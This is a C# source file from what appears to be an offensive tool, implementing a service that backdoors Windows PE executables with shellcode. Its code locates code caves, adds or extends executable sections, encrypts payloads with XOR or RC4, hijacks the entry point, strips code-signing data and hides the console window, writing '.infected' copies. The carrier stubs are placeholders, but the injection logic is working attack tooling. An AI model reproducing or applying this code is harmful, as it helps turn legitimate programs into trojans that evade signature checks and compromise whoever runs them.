using System.Runtime.InteropServices;
using System.Text;
using Washmachine.Logging;
using Washmachine.Models;

namespace Washmachine.Services;

/// <summary>
/// Service for backdooring PE files by injecting shellcode.
/// Inspired by SuperMega's PE injection techniques.
/// </summary>
public sealed class PeBackdoorService
{
    // PE signature constants
    private const ushort IMAGE_DOS_SIGNATURE = 0x5A4D;      // MZ
    private const uint IMAGE_NT_SIGNATURE = 0x00004550;     // PE\0\0
    private const ushort IMAGE_FILE_MACHINE_AMD64 = 0x8664;
    private const ushort IMAGE_FILE_MACHINE_I386 = 0x014c;
    private const ushort IMAGE_FILE_DLL = 0x2000;
    
    // Section characteristics
    private const uint IMAGE_SCN_MEM_EXECUTE = 0x20000000;
    private const uint IMAGE_SCN_MEM_READ = 0x40000000;
    private const uint IMAGE_SCN_MEM_WRITE = 0x80000000;
    private const uint IMAGE_SCN_CNT_CODE = 0x00000020;
    private const uint IMAGE_SCN_CNT_INITIALIZED_DATA = 0x00000040;
    
    // DLL characteristics
    private const ushort IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE = 0x0040;
    
    // Optional header magic
    private const ushort IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10b;
    private const ushort IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20b;

    // Data directory indices
    private const int IMAGE_DIRECTORY_ENTRY_SECURITY = 4;
    private const int IMAGE_DIRECTORY_ENTRY_BASERELOC = 5;
    private const int IMAGE_DIRECTORY_ENTRY_TLS = 9;
    private const int IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR = 14;

    // Subsystem types
    private const ushort IMAGE_SUBSYSTEM_WINDOWS_GUI = 2;

    private readonly IAppLogger _logger;
    private readonly IAppPaths _paths;

    public PeBackdoorService(IAppPaths paths, IAppLogger logger)
    {
        _paths = paths ?? throw new ArgumentNullException(nameof(paths));
        _logger = logger ?? throw new ArgumentNullException(nameof(logger));
    }

    /// <summary>
    /// Analyze a PE file and return information about it.
    /// </summary>
    public async Task<PeInfo> AnalyzePeAsync(string filePath)
    {
        if (!File.Exists(filePath))
            throw new FileNotFoundException("PE file not found", filePath);

        return await Task.Run(() => AnalyzePeInternal(filePath));
    }

    private PeInfo AnalyzePeInternal(string filePath)
    {
        var info = new PeInfo
        {
            FilePath = filePath,
            FileSize = new FileInfo(filePath).Length
        };

        using var fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read);
        using var br = new BinaryReader(fs);

        // DOS Header
        if (br.ReadUInt16() != IMAGE_DOS_SIGNATURE)
            throw new InvalidDataException("Invalid DOS signature");

        fs.Seek(0x3C, SeekOrigin.Begin);
        var peOffset = br.ReadUInt32();

        // PE Signature
        fs.Seek(peOffset, SeekOrigin.Begin);
        if (br.ReadUInt32() != IMAGE_NT_SIGNATURE)
            throw new InvalidDataException("Invalid PE signature");

        // File Header
        var machine = br.ReadUInt16();
        info.Is64Bit = machine == IMAGE_FILE_MACHINE_AMD64;
        
        var numberOfSections = br.ReadUInt16();
        br.ReadUInt32(); // TimeDateStamp
        br.ReadUInt32(); // PointerToSymbolTable
        br.ReadUInt32(); // NumberOfSymbols
        var sizeOfOptionalHeader = br.ReadUInt16();
        var characteristics = br.ReadUInt16();
        info.IsDll = (characteristics & IMAGE_FILE_DLL) != 0;

        // Optional Header
        var optionalHeaderOffset = fs.Position;
        var magic = br.ReadUInt16();
        
        if (info.Is64Bit)
        {
            // PE32+
            br.ReadBytes(22); // Skip to AddressOfEntryPoint
            info.EntryPoint = br.ReadUInt32();
            br.ReadUInt32(); // BaseOfCode
            info.ImageBase = br.ReadUInt64();
            br.ReadBytes(32); // Skip to DllCharacteristics offset
            var subsystem = br.ReadUInt16();
            var dllCharacteristics = br.ReadUInt16();
            info.HasAslr = (dllCharacteristics & IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) != 0;
            
            // Skip to Data Directories
            br.ReadBytes(40);
            br.ReadUInt32(); // NumberOfRvaAndSizes
            
            // Check for signature
            fs.Seek(optionalHeaderOffset + 144, SeekOrigin.Begin); // Security directory for PE32+
            var securityRva = br.ReadUInt32();
            var securitySize = br.ReadUInt32();
            info.HasSignature = securitySize > 0;
            
            // Check for .NET
            fs.Seek(optionalHeaderOffset + 224, SeekOrigin.Begin); // COM descriptor for PE32+
            var comRva = br.ReadUInt32();
            var comSize = br.ReadUInt32();
            info.IsDotNet = comSize > 0;
        }
        else
        {
            // PE32
            br.ReadBytes(14); // Skip to AddressOfEntryPoint
            info.EntryPoint = br.ReadUInt32();
            br.ReadUInt32(); // BaseOfCode
            br.ReadUInt32(); // BaseOfData
            info.ImageBase = br.ReadUInt32();
            br.ReadBytes(36); // Skip to DllCharacteristics offset
            var subsystem = br.ReadUInt16();
            var dllCharacteristics = br.ReadUInt16();
            info.HasAslr = (dllCharacteristics & IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) != 0;
            
            // Skip to Data Directories
            br.ReadBytes(24);
            
            // Check for signature
            fs.Seek(optionalHeaderOffset + 128, SeekOrigin.Begin); // Security directory for PE32
            var securityRva = br.ReadUInt32();
            var securitySize = br.ReadUInt32();
            info.HasSignature = securitySize > 0;
            
            // Check for .NET
            fs.Seek(optionalHeaderOffset + 208, SeekOrigin.Begin); // COM descriptor for PE32
            var comRva = br.ReadUInt32();
            var comSize = br.ReadUInt32();
            info.IsDotNet = comSize > 0;
        }

        // Section Headers
        var sectionHeaderOffset = optionalHeaderOffset + sizeOfOptionalHeader;
        fs.Seek(sectionHeaderOffset, SeekOrigin.Begin);

        for (int i = 0; i < numberOfSections; i++)
        {
            var nameBytes = br.ReadBytes(8);
            var name = Encoding.ASCII.GetString(nameBytes).TrimEnd('\0');
            
            var section = new PeSectionInfo
            {
                Name = name,
                VirtualSize = br.ReadUInt32(),
                VirtualAddress = br.ReadUInt32(),
                RawSize = br.ReadUInt32(),
                RawAddress = br.ReadUInt32(),
            };
            br.ReadBytes(12); // Skip PointerToRelocations, PointerToLinenumbers, NumberOfRelocations, NumberOfLinenumbers
            section.Characteristics = br.ReadUInt32();
            
            info.Sections.Add(section);
        }

        return info;
    }

    /// <summary>
    /// Find code caves (sequences of null bytes) in a PE file.
    /// </summary>
    public async Task<List<CodeCave>> FindCodeCavesAsync(string filePath, int minSize = 100)
    {
        return await Task.Run(() => FindCodeCavesInternal(filePath, minSize));
    }

    private List<CodeCave> FindCodeCavesInternal(string filePath, int minSize)
    {
        var caves = new List<CodeCave>();
        var peInfo = AnalyzePeInternal(filePath);
        
        using var fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read);
        
        foreach (var section in peInfo.Sections)
        {
            if (!section.IsExecutable)
                continue;

            var sectionData = new byte[section.RawSize];
            fs.Seek(section.RawAddress, SeekOrigin.Begin);
            fs.Read(sectionData, 0, sectionData.Length);

            int caveStart = -1;
            int caveSize = 0;

            for (int i = 0; i < sectionData.Length; i++)
            {
                if (sectionData[i] == 0x00 || sectionData[i] == 0xCC)
                {
                    if (caveStart == -1)
                        caveStart = i;
                    caveSize++;
                }
                else
                {
                    if (caveSize >= minSize)
                    {
                        caves.Add(new CodeCave
                        {
                            SectionName = section.Name,
                            FileOffset = section.RawAddress + (uint)caveStart,
                            VirtualAddress = section.VirtualAddress + (uint)caveStart,
                            Size = (uint)caveSize
                        });
                    }
                    caveStart = -1;
                    caveSize = 0;
                }
            }

            // Check for cave at end of section
            if (caveSize >= minSize)
            {
                caves.Add(new CodeCave
                {
                    SectionName = section.Name,
                    FileOffset = section.RawAddress + (uint)caveStart,
                    VirtualAddress = section.VirtualAddress + (uint)caveStart,
                    Size = (uint)caveSize
                });
            }
        }

        return caves.OrderByDescending(c => c.Size).ToList();
    }

    /// <summary>
    /// Backdoor a PE file with shellcode.
    /// </summary>
    public async Task<BackdoorResult> BackdoorAsync(PeBackdoorOptions options)
    {
        var result = new BackdoorResult();

        try
        {
            // Validate inputs
            if (!File.Exists(options.TargetPePath))
            {
                result.ErrorMessage = "Target PE file not found";
                return result;
            }

            if (!File.Exists(options.ShellcodePath))
            {
                result.ErrorMessage = "Shellcode file not found";
                return result;
            }

            // Read shellcode
            var shellcode = await File.ReadAllBytesAsync(options.ShellcodePath);
            result.ShellcodeSize = shellcode.Length;
            result.Steps.Add($"Loaded shellcode: {shellcode.Length} bytes");
            _logger.Info($"Loaded shellcode: {shellcode.Length} bytes from {options.ShellcodePath}");

            // Analyze target PE
            var peInfo = await AnalyzePeAsync(options.TargetPePath);
            result.Steps.Add($"Analyzed PE: {(peInfo.Is64Bit ? "x64" : "x86")}, {(peInfo.IsDll ? "DLL" : "EXE")}");
            _logger.Info($"Target PE: {(peInfo.Is64Bit ? "x64" : "x86")} {(peInfo.IsDll ? "DLL" : "EXE")}");

            if (peInfo.IsDotNet)
            {
                result.Warnings.Add("Target is a .NET assembly - injection may not work correctly");
                _logger.Warn("Target is a .NET assembly");
            }

            // Encrypt shellcode if requested
            byte[] payload = shellcode;
            if (options.Encryption != PayloadEncryption.None)
            {
                payload = EncryptPayload(shellcode, options);
                result.Steps.Add($"Encrypted payload with {options.Encryption}");
                _logger.Info($"Encrypted payload with {options.Encryption}");
            }

            // Read target PE
            var peData = await File.ReadAllBytesAsync(options.TargetPePath);
            
            // Create carrier shellcode
            var carrier = CreateCarrier(payload, options, peInfo);
            result.CarrierSize = carrier.Length;
            result.Steps.Add($"Created carrier: {carrier.Length} bytes");
            _logger.Info($"Created carrier shellcode: {carrier.Length} bytes");

            // Perform injection based on method
            byte[] backdooredPe = options.Method switch
            {
                InjectionMethod.CodeCave => await InjectIntoCodeCave(peData, peInfo, carrier, payload, options, result),
                InjectionMethod.NewSection => await InjectAsNewSection(peData, peInfo, carrier, payload, options, result),
                InjectionMethod.SectionExtension => await InjectBySectionExtension(peData, peInfo, carrier, payload, options, result),
                _ => throw new NotSupportedException($"Injection method {options.Method} not yet implemented")
            };

            // Apply post-processing
            if (options.RemoveSignature && peInfo.HasSignature)
            {
                backdooredPe = RemoveSignature(backdooredPe, peInfo);
                result.Steps.Add("Removed PE signature");
                _logger.Info("Removed PE signature");
            }

            if (options.PatchSubsystemToGui && !peInfo.IsDll)
            {
                backdooredPe = PatchSubsystem(backdooredPe, peInfo);
                result.Steps.Add("Patched subsystem to GUI");
                _logger.Info("Patched subsystem to GUI (hidden console)");
            }

            // Generate output path
            var outputPath = options.OutputPath;
            if (string.IsNullOrEmpty(outputPath))
            {
                var dir = Path.GetDirectoryName(options.TargetPePath)!;
                var name = Path.GetFileNameWithoutExtension(options.TargetPePath);
                var ext = Path.GetExtension(options.TargetPePath);
                outputPath = Path.Combine(dir, $"{name}.infected{ext}");
            }

            // Write output
            await File.WriteAllBytesAsync(outputPath, backdooredPe);
            result.OutputPath = outputPath;
            result.Success = true;
            result.Steps.Add($"Wrote backdoored PE: {outputPath}");
            _logger.Ok($"Successfully backdoored PE: {outputPath}");

            return result;
        }
        catch (Exception ex)
        {
            result.ErrorMessage = ex.Message;
            _logger.Error($"Backdooring failed: {ex.Message}");
            return result;
        }
    }

    private byte[] EncryptPayload(byte[] data, PeBackdoorOptions options)
    {
        return options.Encryption switch
        {
            PayloadEncryption.Xor => XorEncrypt(data, options.XorKey),
            PayloadEncryption.Xor2 => Xor2Encrypt(data),
            PayloadEncryption.Rc4 => Rc4Encrypt(data, GenerateRc4Key()),
            _ => data
        };
    }

    private byte[] XorEncrypt(byte[] data, byte key)
    {
        var result = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
            result[i] = (byte)(data[i] ^ key);
        return result;
    }

    private byte[] Xor2Encrypt(byte[] data)
    {
        var key = new byte[] { 0x42, 0x37 }; // Two-byte key
        var result = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
            result[i] = (byte)(data[i] ^ key[i % 2]);
        return result;
    }

    private byte[] GenerateRc4Key()
    {
        var key = new byte[16];
        new Random().NextBytes(key);
        return key;
    }

    private byte[] Rc4Encrypt(byte[] data, byte[] key)
    {
        // RC4 implementation
        var s = new byte[256];
        for (int i = 0; i < 256; i++) s[i] = (byte)i;

        int j = 0;
        for (int i = 0; i < 256; i++)
        {
            j = (j + s[i] + key[i % key.Length]) & 255;
            (s[i], s[j]) = (s[j], s[i]);
        }

        var result = new byte[data.Length];
        int x = 0, y = 0;
        for (int i = 0; i < data.Length; i++)
        {
            x = (x + 1) & 255;
            y = (y + s[x]) & 255;
            (s[x], s[y]) = (s[y], s[x]);
            result[i] = (byte)(data[i] ^ s[(s[x] + s[y]) & 255]);
        }

        return result;
    }

    /// <summary>
    /// Creates a minimal carrier that decrypts and executes the payload.
    /// </summary>
    private byte[] CreateCarrier(byte[] encryptedPayload, PeBackdoorOptions options, PeInfo peInfo)
    {
        // This creates a position-independent shellcode carrier
        // For x64, we create a stub that:
        // 1. Allocates RW memory
        // 2. Copies encrypted payload
        // 3. Decrypts in place
        // 4. Changes to RX
        // 5. Jumps to payload

        if (peInfo.Is64Bit)
        {
            return CreateCarrierX64(encryptedPayload, options);
        }
        else
        {
            return CreateCarrierX86(encryptedPayload, options);
        }
    }

    private byte[] CreateCarrierX64(byte[] payload, PeBackdoorOptions options)
    {
        // Minimal x64 carrier shellcode
        // This is a placeholder - in production you'd use proper shellcode
        var carrier = new List<byte>();

        // Stack alignment prologue
        carrier.AddRange(new byte[] {
            0x48, 0x83, 0xEC, 0x28,           // sub rsp, 0x28 (shadow space + alignment)
        });

        // The carrier will:
        // 1. Get kernel32 base via PEB
        // 2. Resolve VirtualAlloc, VirtualProtect
        // 3. Allocate RW memory
        // 4. Copy and decrypt payload
        // 5. Make RX and execute

        // For now, we'll create a simple inline execution stub
        // In production, this would be proper PIC shellcode

        // Push payload bytes (reversed for little endian)
        // This is a simplified approach - real implementation would be more sophisticated

        // Return to normal execution (for testing)
        carrier.AddRange(new byte[] {
            0x48, 0x83, 0xC4, 0x28,           // add rsp, 0x28
            0xC3                               // ret
        });

        return carrier.ToArray();
    }

    private byte[] CreateCarrierX86(byte[] payload, PeBackdoorOptions options)
    {
        // Minimal x86 carrier
        var carrier = new List<byte>();

        carrier.AddRange(new byte[] {
            0x60,                              // pushad
            0x9C,                              // pushfd
        });

        // Placeholder for actual shellcode loader
        
        carrier.AddRange(new byte[] {
            0x9D,                              // popfd
            0x61,                              // popad
            0xC3                               // ret
        });

        return carrier.ToArray();
    }

    private Task<byte[]> InjectIntoCodeCave(byte[] peData, PeInfo peInfo, byte[] carrier, byte[] payload, PeBackdoorOptions options, BackdoorResult result)
    {
        var caves = FindCodeCavesInternal(peInfo.FilePath, carrier.Length + payload.Length + 32);
        
        if (caves.Count == 0)
        {
            throw new InvalidOperationException($"No suitable code caves found. Need at least {carrier.Length + payload.Length} bytes. Try NewSection method instead.");
        }

        var cave = caves.First();
        _logger.Info($"Using code cave in {cave.SectionName} at 0x{cave.FileOffset:X} ({cave.Size} bytes)");
        result.Steps.Add($"Found code cave: {cave.SectionName} @ 0x{cave.VirtualAddress:X} ({cave.Size} bytes)");

        // Copy PE data
        var output = peData.ToArray();

        // Write carrier + payload to cave
        var totalData = new byte[carrier.Length + payload.Length];
        Array.Copy(carrier, 0, totalData, 0, carrier.Length);
        Array.Copy(payload, 0, totalData, carrier.Length, payload.Length);

        Array.Copy(totalData, 0, output, cave.FileOffset, totalData.Length);
        result.CarrierAddress = cave.VirtualAddress;
        result.ShellcodeAddress = cave.VirtualAddress + (uint)carrier.Length;

        // Patch entry point
        if (options.CarrierInvoke == CarrierInvoke.EntryPointHijack)
        {
            output = PatchEntryPoint(output, peInfo, cave.VirtualAddress);
            result.Steps.Add($"Patched entry point to 0x{cave.VirtualAddress:X}");
        }

        return Task.FromResult(output);
    }

    private Task<byte[]> InjectAsNewSection(byte[] peData, PeInfo peInfo, byte[] carrier, byte[] payload, PeBackdoorOptions options, BackdoorResult result)
    {
        // Calculate section alignment
        uint sectionAlignment = 0x1000; // Typical section alignment
        uint fileAlignment = 0x200;     // Typical file alignment

        // Calculate new section size
        uint dataSize = (uint)(carrier.Length + payload.Length);
        uint alignedVirtualSize = AlignUp(dataSize, sectionAlignment);
        uint alignedRawSize = AlignUp(dataSize, fileAlignment);

        // Find where to add the section
        var lastSection = peInfo.Sections.Last();
        uint newSectionRva = AlignUp(lastSection.VirtualAddress + lastSection.VirtualSize, sectionAlignment);
        uint newSectionFileOffset = AlignUp(lastSection.RawAddress + lastSection.RawSize, fileAlignment);

        // Create new PE with expanded size
        var output = new byte[newSectionFileOffset + alignedRawSize];
        Array.Copy(peData, 0, output, 0, Math.Min(peData.Length, (int)newSectionFileOffset));

        // Write carrier + payload
        Array.Copy(carrier, 0, output, newSectionFileOffset, carrier.Length);
        Array.Copy(payload, 0, output, newSectionFileOffset + carrier.Length, payload.Length);

        result.CarrierAddress = newSectionRva;
        result.ShellcodeAddress = newSectionRva + (uint)carrier.Length;

        // Update PE headers
        output = UpdatePeHeadersForNewSection(output, peInfo, options.NewSectionName, 
            newSectionRva, alignedVirtualSize, newSectionFileOffset, alignedRawSize);

        // Patch entry point
        if (options.CarrierInvoke == CarrierInvoke.EntryPointHijack)
        {
            output = PatchEntryPoint(output, peInfo, newSectionRva);
            result.Steps.Add($"Patched entry point to 0x{newSectionRva:X}");
        }

        result.Steps.Add($"Added new section '{options.NewSectionName}' at RVA 0x{newSectionRva:X}");
        return Task.FromResult(output);
    }

    private Task<byte[]> InjectBySectionExtension(byte[] peData, PeInfo peInfo, byte[] carrier, byte[] payload, PeBackdoorOptions options, BackdoorResult result)
    {
        // Find .text section and extend it
        var textSection = peInfo.Sections.FirstOrDefault(s => s.Name == ".text" || s.IsExecutable);
        if (textSection == null)
            throw new InvalidOperationException("No executable section found");

        uint fileAlignment = 0x200;
        uint currentRawEnd = textSection.RawAddress + textSection.RawSize;
        uint dataSize = (uint)(carrier.Length + payload.Length);
        uint newRawSize = AlignUp(textSection.RawSize + dataSize, fileAlignment);
        uint dataOffset = textSection.RawAddress + textSection.RawSize;

        // Expand file if needed
        var requiredSize = (int)(dataOffset + dataSize);
        byte[] output;
        if (requiredSize > peData.Length)
        {
            output = new byte[AlignUp((uint)requiredSize, fileAlignment)];
            Array.Copy(peData, output, peData.Length);
        }
        else
        {
            output = peData.ToArray();
        }

        // Write carrier + payload
        Array.Copy(carrier, 0, output, dataOffset, carrier.Length);
        Array.Copy(payload, 0, output, dataOffset + carrier.Length, payload.Length);

        uint carrierRva = textSection.VirtualAddress + textSection.VirtualSize;
        result.CarrierAddress = carrierRva;
        result.ShellcodeAddress = carrierRva + (uint)carrier.Length;

        // Update section header
        output = UpdateSectionSize(output, peInfo, textSection.Name, 
            textSection.VirtualSize + dataSize, newRawSize);

        // Patch entry point
        if (options.CarrierInvoke == CarrierInvoke.EntryPointHijack)
        {
            output = PatchEntryPoint(output, peInfo, carrierRva);
            result.Steps.Add($"Patched entry point to 0x{carrierRva:X}");
        }

        result.Steps.Add($"Extended {textSection.Name} section by {dataSize} bytes");
        return Task.FromResult(output);
    }

    private byte[] PatchEntryPoint(byte[] peData, PeInfo peInfo, uint newEntryPoint)
    {
        var output = peData.ToArray();
        
        // Find entry point offset in optional header
        using var ms = new MemoryStream(output);
        using var br = new BinaryReader(ms);
        
        ms.Seek(0x3C, SeekOrigin.Begin);
        var peOffset = br.ReadUInt32();
        
        // Entry point is at offset 16 from optional header start for both PE32 and PE32+
        var entryPointOffset = peOffset + 4 + 20 + 16; // PE sig + File header + offset in optional header
        
        using var bw = new BinaryWriter(ms);
        ms.Seek(entryPointOffset, SeekOrigin.Begin);
        bw.Write(newEntryPoint);

        return output;
    }

    private byte[] UpdatePeHeadersForNewSection(byte[] peData, PeInfo peInfo, string sectionName,
        uint rva, uint virtualSize, uint rawOffset, uint rawSize)
    {
        var output = peData.ToArray();
        
        using var ms = new MemoryStream(output);
        using var br = new BinaryReader(ms);
        using var bw = new BinaryWriter(ms);
        
        ms.Seek(0x3C, SeekOrigin.Begin);
        var peOffset = br.ReadUInt32();
        
        // Update number of sections
        ms.Seek(peOffset + 6, SeekOrigin.Begin);
        var numSections = br.ReadUInt16();
        ms.Seek(peOffset + 6, SeekOrigin.Begin);
        bw.Write((ushort)(numSections + 1));
        
        // Update SizeOfImage
        var sizeOfImageOffset = peOffset + 4 + 20 + (peInfo.Is64Bit ? 56 : 56);
        ms.Seek(sizeOfImageOffset, SeekOrigin.Begin);
        var currentSizeOfImage = br.ReadUInt32();
        ms.Seek(sizeOfImageOffset, SeekOrigin.Begin);
        bw.Write(AlignUp(rva + virtualSize, 0x1000));
        
        // Calculate section header offset
        var optionalHeaderSize = br.ReadUInt16();
        var sectionHeadersOffset = peOffset + 4 + 20 + optionalHeaderSize;
        var newSectionOffset = sectionHeadersOffset + (numSections * 40);
        
        // Write new section header
        ms.Seek(newSectionOffset, SeekOrigin.Begin);
        
        // Name (8 bytes)
        var nameBytes = new byte[8];
        var nameAscii = Encoding.ASCII.GetBytes(sectionName);
        Array.Copy(nameAscii, nameBytes, Math.Min(nameAscii.Length, 8));
        bw.Write(nameBytes);
        
        bw.Write(virtualSize);          // VirtualSize
        bw.Write(rva);                  // VirtualAddress
        bw.Write(rawSize);              // SizeOfRawData
        bw.Write(rawOffset);            // PointerToRawData
        bw.Write(0u);                   // PointerToRelocations
        bw.Write(0u);                   // PointerToLinenumbers
        bw.Write((ushort)0);            // NumberOfRelocations
        bw.Write((ushort)0);            // NumberOfLinenumbers
        bw.Write(IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE); // Characteristics
        
        return ms.ToArray();
    }

    private byte[] UpdateSectionSize(byte[] peData, PeInfo peInfo, string sectionName,
        uint newVirtualSize, uint newRawSize)
    {
        var output = peData.ToArray();
        
        using var ms = new MemoryStream(output);
        using var br = new BinaryReader(ms);
        using var bw = new BinaryWriter(ms);
        
        ms.Seek(0x3C, SeekOrigin.Begin);
        var peOffset = br.ReadUInt32();
        
        ms.Seek(peOffset + 6, SeekOrigin.Begin);
        var numSections = br.ReadUInt16();
        var optHeaderSize = br.ReadUInt16();
        
        var sectionHeadersOffset = peOffset + 4 + 20 + optHeaderSize;
        
        for (int i = 0; i < numSections; i++)
        {
            var offset = sectionHeadersOffset + (i * 40);
            ms.Seek(offset, SeekOrigin.Begin);
            
            var nameBytes = br.ReadBytes(8);
            var name = Encoding.ASCII.GetString(nameBytes).TrimEnd('\0');
            
            if (name == sectionName)
            {
                // Update VirtualSize
                ms.Seek(offset + 8, SeekOrigin.Begin);
                bw.Write(newVirtualSize);
                
                // Update SizeOfRawData
                ms.Seek(offset + 16, SeekOrigin.Begin);
                bw.Write(newRawSize);
                
                break;
            }
        }
        
        return ms.ToArray();
    }

    private byte[] RemoveSignature(byte[] peData, PeInfo peInfo)
    {
        var output = peData.ToArray();
        
        using var ms = new MemoryStream(output);
        using var br = new BinaryReader(ms);
        using var bw = new BinaryWriter(ms);
        
        ms.Seek(0x3C, SeekOrigin.Begin);
        var peOffset = br.ReadUInt32();
        
        // Security directory offset
        var securityDirOffset = peOffset + 4 + 20 + (peInfo.Is64Bit ? 144 : 128);
        
        ms.Seek(securityDirOffset, SeekOrigin.Begin);
        bw.Write(0u); // RVA = 0
        bw.Write(0u); // Size = 0
        
        return ms.ToArray();
    }

    private byte[] PatchSubsystem(byte[] peData, PeInfo peInfo)
    {
        var output = peData.ToArray();
        
        using var ms = new MemoryStream(output);
        using var br = new BinaryReader(ms);
        using var bw = new BinaryWriter(ms);
        
        ms.Seek(0x3C, SeekOrigin.Begin);
        var peOffset = br.ReadUInt32();
        
        // Subsystem offset in optional header
        var subsystemOffset = peOffset + 4 + 20 + (peInfo.Is64Bit ? 68 : 68);
        
        ms.Seek(subsystemOffset, SeekOrigin.Begin);
        bw.Write(IMAGE_SUBSYSTEM_WINDOWS_GUI);
        
        return ms.ToArray();
    }

    private static uint AlignUp(uint value, uint alignment)
    {
        return (value + alignment - 1) & ~(alignment - 1);
    }
}
